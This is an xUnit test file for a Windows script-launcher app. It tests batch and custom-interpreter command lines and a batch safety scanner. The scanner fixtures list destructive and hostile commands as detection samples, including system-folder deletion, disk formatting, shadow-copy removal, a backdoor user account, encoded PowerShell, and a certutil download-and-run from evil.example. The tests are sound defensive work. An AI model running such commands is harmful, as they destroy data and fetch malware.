using System.Text;
using System.Text.Json;
using Xunit;

namespace Shelly.Core.Tests;

/// <summary>Tests that change the custom interpreter registry (a static of <see cref="ScriptKinds"/>) run alone.</summary>
[CollectionDefinition("CustomRegistry", DisableParallelization = true)]
public class CustomRegistryCollection { }

/// <summary>1.3.0: batch files (.bat / .cmd), custom interpreters, mixed console output decoding.</summary>
public class Release130Tests
{
    static readonly Encoding Cp866 = ConsoleText.Encoding(866);
    const string Bat = @"C:\My Scripts\hello.bat";

    // ---------- Batch command line ----------

    [Fact]
    public void Batch_inline_command_line_uses_call_and_utf8_code_page()
    {
        Assert.Equal("/d /s /c \"chcp 65001 >nul & call \"C:\\My Scripts\\hello.bat\" a \"b c\" \"d&e\" \"x=1\" \"\"\"",
            BatchRun.InlineArgs(Bat, "a \"b c\" d&e x=1 \"\"", true));
        Assert.Equal("/d /s /c \"call \"C:\\My Scripts\\hello.bat\"\"", BatchRun.InlineArgs(Bat, "", false));
        Assert.Equal("/d /s /c \"call \"C:\\x.cmd\" C:\\dir\\ 42\"", BatchRun.InlineArgs(@"C:\x.cmd", @"C:\dir\ 42", false));
    }

    [Theory]
    [InlineData("plain words 42", null)]
    [InlineData("\"with spaces\" a&b (x) a;b a,b !x", null)]
    [InlineData("50%", "batArgsBad")]
    [InlineData("%PATH%", "batArgsBad")]
    [InlineData("a^b", "batArgsBad")]
    [InlineData("say \\\"hi\\\"", "batArgsBad")]   // a quote that would end up inside an argument
    [InlineData("a\nb", "rsPyArgsBad")]
    public void Batch_arguments_cmd_cannot_pass_are_refused(string args, string? expected)
    {
        Assert.Equal(expected, BatchRun.ArgsError(args));
        Assert.Equal(expected, ScriptLangs.ArgsError(ScriptLangs.Batch, args));
    }

    [Fact]
    public void Batch_rules_apply_only_to_batch()
    {
        Assert.Null(ScriptLangs.ArgsError(ScriptLangs.Python, "50% ^"));
        Assert.Null(ScriptLangs.ArgsError(ScriptLangs.Custom, "50% ^", new CustomInterpreter { Program = @"C:\node\node.exe" }));
        Assert.Equal("batArgsBad", ScriptLangs.ArgsError(ScriptLangs.Custom, "50%", new CustomInterpreter { Program = @"C:\tools\run.cmd" }));
        Assert.Equal("rsPyArgsBad", ScriptLangs.ArgsError(ScriptLangs.Python, new string('x', PythonRun.MaxArgsLength + 1)));
        Assert.Equal("batPathBad", BatchRun.PathError(@"C:\100%\a.bat"));
        Assert.Equal("batPathBad", BatchRun.PathError(@"C:\a^b\a.bat"));
        Assert.Null(BatchRun.PathError(@"C:\Мои скрипты (новые)\a&b.bat"));
    }

    [Fact]
    public void Batch_window_goes_through_powershell_with_legacy_passing()
    {
        string a = BatchRun.WindowArgs(@"C:\Windows\system32\cmd.exe", @"C:\It's\run.bat", "x \"y z\"", true, null, @"C:\T\done.txt");
        Assert.StartsWith("-NoProfile -NoExit -ExecutionPolicy Bypass -Command \"", a);
        Assert.Contains("$PSNativeCommandArgumentPassing='Legacy'; & 'C:\\Windows\\system32\\cmd.exe' /d /s /c 'chcp 65001 >nul & call \\\"C:\\It''s\\run.bat\\\" x \\\"y z\\\"'", a);
        Assert.Contains("Set-Location -LiteralPath 'C:\\It''s'", a);
        Assert.Contains("$sc=$LASTEXITCODE", a);
        Assert.Contains("done.txt", a);
        string adm = BatchRun.WindowArgs(@"C:\Windows\system32\cmd.exe", @"C:\a.bat", "", false, new string('A', 64), null);
        Assert.Contains("Get-FileHash -LiteralPath 'C:\\a.bat'", adm);
        Assert.DoesNotContain("chcp", adm);
    }

    [Fact]
    public void Comspec_falls_back_to_system32()
    {
        Assert.Equal(@"D:\Win\cmd.exe", BatchRun.ComSpec(n => n == "ComSpec" ? "\"D:\\Win\\cmd.exe\"" : null));
        Assert.Equal(@"C:\Windows\System32\cmd.exe", BatchRun.ComSpec(n => n == "SystemRoot" ? @"C:\Windows\" : null));
        Assert.Equal(@"C:\Windows\System32\cmd.exe", BatchRun.ComSpec(_ => null));
    }

    [Fact]
    public void Utf8_source_detection_and_decoding()
    {
        Assert.True(BatchRun.IsUtf8Source(Encoding.ASCII.GetBytes("@echo off\r\necho hi\r\n")));
        Assert.True(BatchRun.IsUtf8Source(Encoding.UTF8.GetBytes("echo Привет\r\n")));
        Assert.False(BatchRun.IsUtf8Source(Cp866.GetBytes("echo Привет\r\n")));
        Assert.True(BatchRun.HasBom(new byte[] { 0xEF, 0xBB, 0xBF, 0x40 }));
        Assert.Contains("Привет", BatchRun.Decode(Encoding.UTF8.GetBytes("echo Привет")));
        Assert.Equal("Привет", ConsoleText.Decode(Cp866.GetBytes("Привет"), Cp866));
        Assert.Equal("Привет", ConsoleText.Decode(Encoding.UTF8.GetBytes("Привет\r"), Cp866));
        Assert.Equal("ok", ConsoleText.Decode(new byte[] { 0xEF, 0xBB, 0xBF, (byte)'o', (byte)'k' }, Cp866));
        Assert.Equal("", ConsoleText.Decode(Array.Empty<byte>(), Cp866));
    }

    [Fact]
    public void Line_splitter_handles_crlf_lone_cr_and_chunks()
    {
        var s = new LineSplitter();
        var all = new List<string>();
        void Push(string t) { var b = Encoding.ASCII.GetBytes(t); all.AddRange(s.Push(b, b.Length).Select(x => Encoding.ASCII.GetString(x))); }
        Push("a\r"); Push("\nb\n"); Push("c\rd"); Push("e\r\n\r\n"); Push("tail");
        Assert.Equal(new[] { "a", "b", "c", "de", "" }, all);
        Assert.Equal("tail", Encoding.ASCII.GetString(s.Flush()!));
        Assert.Null(s.Flush());
        var big = new byte[LineSplitter.MaxLine + 10];
        Array.Fill(big, (byte)'x');
        Assert.Single(new LineSplitter().Push(big, big.Length));
    }

    [Fact]
    public void Inline_runner_decodes_utf8_and_oem_lines()
    {
        if (OperatingSystem.IsWindows() || !File.Exists("/bin/sh")) return;
        using var r = new InlineRunner { MixedFallback = Cp866 };
        using var done = new ManualResetEventSlim();
        r.Finished += _ => done.Set();
        // UTF-8 line, a cp866 line ("Привет"), stderr, no final newline, exit code 3
        r.Start("/bin/sh", "-c \"printf 'Hello \\320\\234\\320\\270\\321\\200\\n\\217\\340\\250\\242\\245\\342\\n'; printf 'oops\\n' >&2; printf 'end'; exit 3\"", Path.GetTempPath());
        Assert.True(done.Wait(TimeSpan.FromSeconds(20)));
        var lines = new List<string>();
        while (r.Lines.TryDequeue(out var l)) lines.Add(l);
        Assert.Contains("Hello Мир", lines);
        Assert.Contains("Привет", lines);
        Assert.Contains("! oops", lines);
        Assert.Contains("end", lines);
        Assert.Equal(3, r.ExitCode);
        Assert.Equal("oops", r.ErrorText());
    }

    [Fact]
    public void Batch_template_is_crlf_and_escaped()
    {
        Loc.Language = "en";
        string t = BatchRun.Template("100% done & more");
        Assert.StartsWith("@echo off\r\nrem ", t);
        Assert.Contains("100%% done ^& more", t);
        Assert.DoesNotContain("\n", t.Replace("\r\n", ""));
        Assert.Equal("", ScriptCatalog.Template("x", ".js"));
        Assert.StartsWith("@echo off", ScriptCatalog.Template("x", ".cmd"));
    }

    // ---------- Custom interpreters: command line ----------

    [Fact]
    public void Custom_template_tokens_expand_into_single_arguments()
    {
        const string js = @"C:\My Scripts\tool.js";
        Assert.Equal(new[] { js, "--n", "A B" }, CustomRun.ArgList(null, js, "--n \"A B\""));
        Assert.Equal(new[] { "-f", js, @"--cwd=C:\My Scripts" }, CustomRun.ArgList("-f \"{script}\" --cwd={dir}", js, ""));
        Assert.Equal(new[] { js, "--args=x y" }, CustomRun.ArgList("{script} --args={args}", js, " x y "));
        Assert.Equal(new[] { "run", js }, CustomRun.ArgList("run {script} {args}", js, ""));
    }

    [Theory]
    [InlineData("a b")]
    [InlineData("say \\\"hi\\\" & calc")]
    [InlineData("C:\\dir\\ \"tail\\\\\"")]
    [InlineData("\"\" x")]
    public void Custom_native_args_round_trip(string userArgs)
    {
        var list = CustomRun.ArgList("{script} {args}", @"C:\a b\x.rb", userArgs);
        Assert.Equal(list, PythonRun.Split(CustomRun.NativeArgs(list)));
    }

    [Fact]
    public void Custom_cmd_program_runs_through_cmd()
    {
        var c = new CustomInterpreter { Id = "0a0b0c0d", Name = "Wrap", Extensions = { ".wr" }, Program = @"C:\tools\wrap.cmd", Template = "{script} {args}" };
        var (exe, args, err) = CustomRun.Inline(c, c.Program, @"C:\s\a.wr", "1 \"2 3\"", @"C:\Windows\System32\cmd.exe");
        Assert.Equal(@"C:\Windows\System32\cmd.exe", exe);
        Assert.Equal("/d /s /c \"call \"C:\\tools\\wrap.cmd\" C:\\s\\a.wr 1 \"2 3\"\"", args);
        Assert.Null(err);
        Assert.Equal("batArgsBad", CustomRun.Inline(c, c.Program, @"C:\s\a.wr", "100%", "cmd.exe").Error);
        var n = new CustomInterpreter { Id = "0a0b0c0e", Name = "Node", Extensions = { ".js" }, Program = "node", Template = "--no-warnings {script} {args}" };
        var r = CustomRun.Inline(n, @"C:\node\node.exe", @"C:\s\a b.js", "x", "cmd.exe");
        Assert.Equal(@"C:\node\node.exe", r.Exe);
        Assert.Equal("\"--no-warnings\" \"C:\\s\\a b.js\" \"x\"", r.Args);
        string w = CustomRun.WindowArgs(n, @"C:\node\node.exe", @"C:\s\a b.js", "x", "cmd.exe", @"C:\s", null, null);
        Assert.Contains("& 'C:\\node\\node.exe' '--no-warnings' 'C:\\s\\a b.js' 'x'", w);
        Assert.Equal(@"C:\s", CustomRun.WorkDir(n, @"C:\node\node.exe", @"C:\s\a b.js"));
        n.ScriptDir = false;
        Assert.Equal(@"C:\node", CustomRun.WorkDir(n, @"C:\node\node.exe", @"C:\s\a b.js"));
    }

    // ---------- Custom interpreters: settings ----------

    [Theory]
    [InlineData("js, .MJS;*.ts  js", ".js .mjs .ts")]
    [InlineData("", "")]
    [InlineData(".tar.gz", null)]
    [InlineData("..x", null)]
    [InlineData(".a/b", null)]
    public void Extensions_are_parsed(string text, string? expected)
    {
        var r = CustomInterpreters.ParseExtensions(text, out var bad);
        if (expected == null) { Assert.Null(r); Assert.NotEqual("", bad); }
        else Assert.Equal(expected, string.Join(" ", r!));
    }

    static readonly string[] PathDirs = { @"C:\Tools", @"C:\node" };
    static bool Exists(string p) => p is @"C:\node\node.exe" or @"C:\Tools\ruby.cmd" or @"D:\lua\lua.exe";

    [Fact]
    public void Program_is_resolved_by_path_or_on_PATH()
    {
        Assert.Equal(@"C:\node\node.exe", CustomInterpreters.ResolveProgram("node", Exists, PathDirs));
        Assert.Equal(@"C:\Tools\ruby.cmd", CustomInterpreters.ResolveProgram("ruby", Exists, PathDirs));
        Assert.Equal(@"D:\lua\lua.exe", CustomInterpreters.ResolveProgram("\"D:\\lua\\lua.exe\"", Exists, PathDirs));
        Assert.Null(CustomInterpreters.ResolveProgram(@"D:\lua\luajit.exe", Exists, PathDirs));
        Assert.Null(CustomInterpreters.ResolveProgram("deno", Exists, PathDirs));
        Assert.Null(CustomInterpreters.ResolveProgram("  ", Exists, PathDirs));
    }

    [Theory]
    [InlineData("{script} {args}", null)]
    [InlineData("", null)]
    [InlineData("run \"{script}\" --dir={dir} {args}", null)]
    [InlineData("{args}", "ciErrNoScript")]
    [InlineData("{script} {file}", "ciErrToken")]
    [InlineData("{script}\n{args}", "ciErrTemplate")]
    public void Template_is_checked(string t, string? expected) => Assert.Equal(expected, CustomInterpreters.TemplateError(t));

    [Fact]
    public void Interpreter_is_validated()
    {
        var other = new CustomInterpreter { Id = "11111111", Name = "Node", Extensions = { ".js" }, Program = "node" };
        CustomInterpreter Make(Action<CustomInterpreter> set) { var c = new CustomInterpreter { Id = "22222222", Name = "Ruby", Extensions = { ".rb" }, Program = "ruby" }; set(c); return c; }
        string? V(CustomInterpreter c) => CustomInterpreters.Validate(c, new[] { other }, Exists, PathDirs)?.Key;
        Assert.Null(V(Make(_ => { })));
        Assert.Equal("ciErrName", V(Make(c => c.Name = " ")));
        Assert.Equal("ciErrName", V(Make(c => c.Name = new string('n', 41))));
        Assert.Equal("ciErrExt", V(Make(c => c.Extensions.Clear())));
        foreach (var e in new[] { ".ps1", ".py", ".bat", ".cmd", ".exe", ".lnk" })
            Assert.Equal("ciErrExtBuiltIn", V(Make(c => c.Extensions = new() { e })));
        Assert.Equal("ciErrExtTaken", V(Make(c => c.Extensions.Add(".js"))));
        Assert.Null(V(Make(c => { c.Id = other.Id; c.Extensions.Add(".js"); })));   // editing itself
        Assert.Equal("ciErrProgram", V(Make(c => c.Program = "")));
        Assert.Equal("ciErrProgramMissing", V(Make(c => c.Program = @"C:\nope\ruby.exe")));
        Assert.Equal("ciErrToken", V(Make(c => c.Template = "{script} {x}")));
    }

    [Fact]
    public void Interpreters_round_trip_through_settings_and_old_files_load()
    {
        var old = new Settings();
        old.LoadJson("{\"language\": \"ru\", \"schedules\": []}");   // a 1.2.0 file
        Assert.Empty(old.CustomInterpreters);
        Assert.Empty(CustomInterpreters.Load(old));

        var s = new Settings();
        var c = new CustomInterpreter { Id = CustomInterpreters.NewId(), Name = "Node \"LTS\"", Extensions = { ".js", ".mjs" }, Program = @"C:\Program Files\nodejs\node.exe", Template = "--x {script} {args}", ScriptDir = false };
        CustomInterpreters.Put(s, c);
        CustomInterpreters.Put(s, new CustomInterpreter { Id = "abcdef01", Name = "Lua", Extensions = { ".lua" }, Program = "lua" });
        var back = new Settings();
        back.LoadJson(s.ToJson());
        var list = CustomInterpreters.Load(back);
        Assert.Equal(2, list.Count);
        var b = list[0];
        Assert.Equal((c.Id, c.Name, c.ExtText, c.Program, c.Template, c.ScriptDir), (b.Id, b.Name, b.ExtText, b.Program, b.Template, b.ScriptDir));
        Assert.True(list[1].ScriptDir);
        Assert.Equal(CustomInterpreter.DefaultTemplate, list[1].Template);
        c.Name = "Node";
        CustomInterpreters.Put(s, c);   // replaced by id
        Assert.Equal(new[] { "Node", "Lua" }, CustomInterpreters.Load(s).Select(x => x.Name));
        CustomInterpreters.Remove(s, "abcdef01");
        Assert.Single(CustomInterpreters.Load(s));
        // broken entries are dropped on load
        var bad = new Settings();
        bad.LoadJson("{\"customInterpreters\": [\"not json\", \"{\\\"id\\\":\\\"zz\\\"}\", \"{\\\"id\\\":\\\"12345678\\\",\\\"name\\\":\\\"R\\\",\\\"ext\\\":\\\".r\\\",\\\"program\\\":\\\"Rscript\\\"}\"]}");
        var only = Assert.Single(CustomInterpreters.Load(bad));
        Assert.Equal(".r", only.ExtText);
    }

    // ---------- Batch safety check ----------

    static List<DangerFinding> ScanBat(params string[] lines) => BatchScanner.Scan(string.Join("\r\n", lines));

    [Theory]
    [InlineData("rd /s /q C:\\Windows", "DelSys", "high")]
    [InlineData("rmdir /S /Q \"%SystemRoot%\\Temp\"", "DelSys", "high")]
    [InlineData("del /s /q *.tmp", "Del", "medium")]
    [InlineData("del /q old.log", "Del", "low")]
    [InlineData("format D: /q /y", "Disk", "high")]
    [InlineData("reg delete \"HKLM\\SOFTWARE\\Foo\" /f", "RegDel", "high")]
    [InlineData("reg add HKCU\\Software\\Foo /v x /d 1 /f", "RegWrite", "medium")]
    [InlineData("bcdedit /set {current} safeboot minimal", "Boot", "high")]
    [InlineData("vssadmin delete shadows /all /quiet", "Shadows", "high")]
    [InlineData("cipher /w:C:\\", "Wipe", "high")]
    [InlineData("takeown /f C:\\Windows\\System32\\x.dll", "Acl", "high")]
    [InlineData("icacls \"C:\\Program Files\\App\" /grant Everyone:F", "Acl", "high")]
    [InlineData("shutdown /r /t 0", "Power", "high")]
    [InlineData("net user hacker P@ss /add", "Account", "high")]
    [InlineData("powershell -NoProfile -EncodedCommand ZQBjAGgAbwA=", "Encoded", "high")]
    [InlineData("if exist C:\\x (rd /s /q C:\\) else echo no", "DelSys", "high")]
    [InlineData("if /i \"%1\"==\"wipe\" del /f /s /q C:\\Users\\*", "DelSys", "high")]
    [InlineData("for %%f in (*.bak) do del /s /q %%f", "Del", "medium")]
    [InlineData("start \"\" /wait cmd /c rd /s /q C:\\Windows", "DelSys", "high")]
    [InlineData("@echo off & call vssadmin delete shadows /all", "Shadows", "high")]
    [InlineData("schtasks /create /tn x /tr y /sc onlogon /ru SYSTEM", "Task", "high")]
    public void Batch_dangerous_commands_are_found(string line, string rule, string sev)
    {
        var f = ScanBat("@echo off", line);
        var hit = Assert.Single(f, x => x.Rule == rule);
        Assert.Equal(sev, hit.Sev);
        Assert.Equal(2, hit.Line);
        Assert.Equal(line, hit.Code);
    }

    [Fact]
    public void Batch_harmless_lines_and_comments_are_not_flagged()
    {
        Assert.Empty(ScanBat("@echo off", "rem rd /s /q C:\\Windows", ":: format C:", "echo del /s /q C:\\ is dangerous",
            "set x=format", ":label", "call :label rd", "goto :eof", "del notes.txt", "copy a b", "ping 127.0.0.1 -n 2 >nul", "exit /b 3"));
    }

    [Fact]
    public void Batch_continuation_download_and_run()
    {
        var f = ScanBat("rd /s ^", "/q C:\\Windows");
        Assert.Equal(1, Assert.Single(f).Line);
        var d = ScanBat("certutil -urlcache -f http://evil.example/a.exe a.exe", "a.exe");
        var dl = Assert.Single(d, x => x.Rule == "DlExec");
        Assert.Equal(2, dl.Line);
        Assert.Equal("high", dl.Sev);
    }

    // ---------- Header comments ----------

    [Fact]
    public void Batch_and_custom_comments_give_description_and_directives()
    {
        const string bat = "@echo off\r\nchcp 65001 >nul\r\nrem Shelly-Mode: window\r\n:: Shelly-Icon: E7C3\r\nREM   Backs up the photos\r\nrem second\r\necho hi\r\n";
        Assert.Equal("Backs up the photos", CommentHeader.Description(bat, ScriptLangs.Batch));
        Assert.Equal("window", ScriptHeader.ModeIn(bat, ScriptLangs.Batch));
        Assert.Equal("\uE7C3", ScriptHeader.IconGlyph(bat, ScriptLangs.Batch));
        Assert.Null(ScriptHeader.ModeIn("@echo off\r\necho x\r\nrem Shelly-Mode: admin\r\n", ScriptLangs.Batch));
        Assert.Equal("", CommentHeader.Description("@echo off\r\necho rem nope\r\n", ScriptLangs.Batch));
        const string js = "#!/usr/bin/env node\n// Shelly-Mode: inline\n// Prints the date\nconsole.log(1)\n";
        Assert.Equal("Prints the date", CommentHeader.Description(js, ScriptLangs.Custom));
        Assert.Equal("inline", ScriptHeader.ModeIn(js, ScriptLangs.Custom));
        Assert.Equal("Lua here", CommentHeader.Description("-- Lua here\nprint(1)", ScriptLangs.Custom));
        Assert.Equal("VB", CommentHeader.Description("' VB\nx", ScriptLangs.Custom));
        // PowerShell is unchanged
        Assert.Equal("inline", ScriptHeader.ModeIn("# Shelly-Mode: inline\nWrite-Host 1"));
        Assert.Null(ScriptHeader.ModeIn("rem Shelly-Mode: inline\n"));
    }

    // ---------- Engines, history, sort, notes ----------

    [Fact]
    public void Engines_and_history_keep_the_language()
    {
        Loc.Language = "en";
        Assert.Equal(("bat", "x", "py"), (EngineInfo.Short(EngineInfo.Batch), EngineInfo.Short(EngineInfo.Custom), EngineInfo.Short(EngineInfo.Python)));
        Assert.Equal("Batch (cmd.exe)", EngineInfo.Name(EngineInfo.Batch));
        Assert.Equal("Custom interpreter", EngineInfo.Name(EngineInfo.Custom));
        Assert.Equal("bat", ScriptLangs.EngineOf(ScriptLangs.Batch));
        Assert.Equal("5.1", ScriptLangs.EngineOf(ScriptLangs.PowerShell));
        foreach (var eng in new[] { "py", "bat", "x", "7", "5.1" })
        {
            var e = new RunEntry { Id = "20261022-140000-000-abcd", Rel = "a", Name = "a", Engine = eng, Kind = "ok", Start = new DateTime(2026, 10, 22, 14, 0, 0) };
            using var doc = JsonDocument.Parse(HistoryStore.ToJsonLine(e));
            Assert.Equal(eng, HistoryStore.FromJson(doc.RootElement)!.Engine);
        }
        using var junk = JsonDocument.Parse("{\"id\":\"x1\",\"rel\":\"a\",\"engine\":\"zz\",\"kind\":\"ok\",\"start\":\"2026-10-22T14:00:00.000\"}");
        Assert.Equal("5.1", HistoryStore.FromJson(junk.RootElement)!.Engine);
    }

    [Fact]
    public void Scan_notes()
    {
        Assert.Null(ScanNotes.Key("ok"));
        Assert.Equal("motwScanClean", ScanNotes.Key("ok", "motwScanClean"));
        Assert.Equal("batScanNote", ScanNotes.Key("basic"));
        Assert.Equal("customNoScan", ScanNotes.Key("custom"));
        Assert.Equal("pyNoScan", ScanNotes.Key("none"));
        Assert.Equal("dzUnverified", ScanNotes.Key("unverified"));
        // a batch file's light check does not block a schedule; an unverified PowerShell one does
        Assert.Null(ScheduleGate.Block(new ScheduleGate.Input { Scan = "basic" }));
        Assert.Null(ScheduleGate.Block(new ScheduleGate.Input { Scan = "custom" }));
        Assert.NotNull(ScheduleGate.Block(new ScheduleGate.Input { Scan = "unverified" }));
    }

    [Fact]
    public void New_script_names_keep_batch_extensions()
    {
        string dir = TestUtil.TempDir();
        Assert.Equal(".bat", ScriptCatalog.ResolveNewScript(dir, "Tools\\backup.bat")!.Ext);
        Assert.Equal(".cmd", ScriptCatalog.ResolveNewScript(dir, "run.CMD")!.Ext);
        Assert.Equal(".ps1", ScriptCatalog.ResolveNewScript(dir, "plain")!.Ext);
    }

    [Fact]
    public void Language_of_built_in_extensions()
    {
        Assert.Equal(ScriptLangs.Batch, ScriptKinds.Lang("a.BAT"));
        Assert.Equal(ScriptLangs.Batch, ScriptKinds.Lang("a.cmd"));
        Assert.Equal(ScriptLangs.Python, ScriptKinds.Lang("a.py"));
        Assert.Equal(ScriptLangs.PowerShell, ScriptKinds.Lang("a.ps1"));
        Assert.Equal("cmd", ScriptKinds.RunnerOf("a.bat"));
        var f = new ScriptFile { Path = @"C:\s\a.cmd", Rel = "a.cmd" };
        Assert.True(f.IsBatch && f.UsesArgs && !f.IsPowerShell && !f.IsPython && !f.IsCustom);
        Assert.True(new ScriptFile { Path = "a.ps1", Rel = "a.ps1" }.IsPowerShell);
        Assert.Equal(new[] { 0, 1, 2, 3 }, new[] { "ps", "py", "bat", "custom" }.Select(ScriptLangs.Order));
    }
}

[Collection("CustomRegistry")]
public class CustomRegistryTests : IDisposable
{
    public void Dispose() => ScriptKinds.SetCustom(null);

    static CustomInterpreter Ci(string id, string name, params string[] ext) =>
        new() { Id = id, Name = name, Extensions = ext.ToList(), Program = "x" };

    [Fact]
    public void Registry_adds_extensions_first_entry_wins()
    {
        ScriptKinds.SetCustom(new[] { Ci("00000001", "Node", ".js", ".mjs"), Ci("00000002", "Other", ".js", ".lua"), Ci("00000003", "Bad", ".bat") });
        Assert.Equal(".js", ScriptKinds.Ext(@"C:\x\A.JS"));
        Assert.Equal("Node", ScriptKinds.CustomFor("a.js")!.Name);
        Assert.Equal("Other", ScriptKinds.CustomFor("a.lua")!.Name);
        Assert.Null(ScriptKinds.CustomFor("a.bat"));
        Assert.Equal(ScriptLangs.Batch, ScriptKinds.Lang("a.bat"));
        Assert.Equal(ScriptLangs.Custom, ScriptKinds.Lang("a.mjs"));
        Assert.Equal("custom", ScriptKinds.RunnerOf("a.mjs"));
        Assert.Equal(2, ScriptKinds.Custom.Count);
        Assert.Equal(new[] { ".ps1", ".py", ".bat", ".cmd", ".js", ".mjs", ".lua" }, ScriptKinds.AllExtensions);
        Assert.Null(ScriptKinds.Ext("a.txt"));
        ScriptKinds.SetCustom(null);
        Assert.Null(ScriptKinds.Ext("a.js"));
    }

    [Fact]
    public void Scan_lists_batch_and_custom_scripts_and_sorts_by_type()
    {
        ScriptKinds.SetCustom(new[] { Ci("00000001", "Node", ".js") });
        string root = TestUtil.TempDir();
        var paths = new AppPaths(Path.Combine(root, "shelly"));
        paths.EnsureFolders();
        foreach (var n in new[] { "z.ps1", "b.py", "c.bat", "d.CMD", "e.js", "f.txt", "g.vbs" }) File.WriteAllText(Path.Combine(paths.Scripts, n), "x");
        var files = ScriptCatalog.Scan(paths, Array.Empty<string>());
        Assert.Equal(new[] { "b.py", "c.bat", "d.CMD", "e.js", "z.ps1" }, files.Select(f => f.Rel).OrderBy(x => x, StringComparer.OrdinalIgnoreCase));
        Assert.True(files.Single(f => f.Rel == "e.js").IsCustom);
        var sorted = FavoriteOrder.Sort(files.OrderBy(f => f.Rel).ToList(), "type", _ => default);
        Assert.Equal(new[] { "z.ps1", "b.py", "c.bat", "d.CMD", "e.js" }, sorted.Select(f => f.Rel));
    }

    [Fact]
    public void Run_plan_for_batch_and_custom_scripts()
    {
        const string cs = @"C:\Windows\system32\cmd.exe";
        var bat = new ScriptFile { Path = @"C:\s\a.bat", Rel = "a.bat" };
        var p = OtherRun.Plan(bat, "x \"y z\"", out var err, out _, cs, content: Encoding.UTF8.GetBytes("echo привет"))!;
        Assert.Null(err);
        Assert.Equal(EngineInfo.Batch, p.Engine);
        Assert.Equal(cs, p.Exe);
        Assert.Equal("/d /s /c \"chcp 65001 >nul & call \"C:\\s\\a.bat\" x \"y z\"\"", p.InlineArgs);
        Assert.Equal(@"C:\s", p.WorkDir);
        Assert.Contains("-NoExit", p.Window(null, null));
        // Not UTF-8 (cp866 text): no chcp
        var oem = OtherRun.Plan(bat, "", out _, out _, cs, content: new byte[] { 0x65, 0x63, 0x68, 0x6F, 0x20, 0xAF, 0xE0 })!;
        Assert.DoesNotContain("chcp", oem.InlineArgs);
        Assert.Null(OtherRun.Plan(bat, "100%", out err, out _, cs, content: new byte[0]));
        Assert.Equal("batArgsBad", err);
        Assert.Null(OtherRun.Plan(new ScriptFile { Path = @"C:\s\50%.bat", Rel = "50%.bat" }, "", out err, out _, cs, content: new byte[0]));
        Assert.Equal("batPathBad", err);

        var js = new ScriptFile { Path = @"C:\s\b.js", Rel = "b.js" };
        Assert.Null(OtherRun.Plan(js, "", out err, out _, cs));
        Assert.Equal("customGone", err);
        ScriptKinds.SetCustom(new[] { new CustomInterpreter { Id = "00000001", Name = "Node", Extensions = { ".js" }, Program = "node" } });
        Assert.Null(OtherRun.Plan(js, "", out err, out var detail, cs, _ => false, new[] { @"C:\n" }));
        Assert.Equal(("customNoProgram", "node"), (err, detail));
        var n = OtherRun.Plan(js, "--x \"a b\"", out err, out _, cs, path => path == @"C:\n\node.exe", new[] { @"C:\n" })!;
        Assert.Null(err);
        Assert.Equal((EngineInfo.Custom, @"C:\n\node.exe", "Node"), (n.Engine, n.Exe, n.Label));
        Assert.Equal("\"C:\\s\\b.js\" \"--x\" \"a b\"", n.InlineArgs);   // every argument quoted for CommandLineToArgvW
        Assert.Equal(@"C:\s", n.WorkDir);
    }

    [Fact]
    public void New_strings_exist_in_both_languages_without_long_dashes()
    {
        string[] keys = { "engBatch", "engCustom", "issBatBom", "issCustomMissing", "batArgsBad", "batPathBad", "batScanNote", "customNoScan",
            "edScanBatch", "edScanCustom", "customGone", "customNoProgram", "batMarkTip", "customMarkTip", "customMarkMissing", "setShellCustom",
            "ciTitleNew", "ciTitleEdit", "ciName", "ciNameHint", "ciExt", "ciExtHint", "ciProgram", "ciProgramHint", "ciBrowse", "ciPick", "ciExeFilter",
            "ciTemplate", "ciTemplateHint", "ciScriptDir", "ciSave", "ciErrName", "ciErrExt", "ciErrExtBuiltIn", "ciErrExtTaken", "ciErrProgram",
            "ciErrProgramMissing", "ciErrTemplate", "ciErrToken", "ciErrNoScript", "ciErrMax", "ciNote", "ciAdd", "ciEmpty", "ciEdit", "ciDelete",
            "ciMissing", "ciSaved", "ciDeleted", "ciDeleteTitle", "ciDeleteText", "rsBatArgsTip", "rsBatArgsHint", "rsCustomArgsTip", "rsCustomArgsHint" };
        string old = Loc.Language;
        try
        {
            foreach (var lang in new[] { "en", "ru" })
            {
                Loc.SetLanguage(lang);
                foreach (var k in keys)
                {
                    Assert.True(Loc.Has(k), k);
                    string t = Loc.T(k);
                    Assert.False(string.IsNullOrWhiteSpace(t) || t == k, k);
                    Assert.DoesNotContain("\u2014", t);
                }
                Assert.Equal(lang == "ru" ? "Скрипты (*.ps1;*.bat)|*.ps1;*.bat" : "Scripts (*.ps1;*.bat)|*.ps1;*.bat", Loc.F("scriptsFilter", "*.ps1;*.bat"));
            }
        }
        finally { Loc.SetLanguage(old); }
    }
}
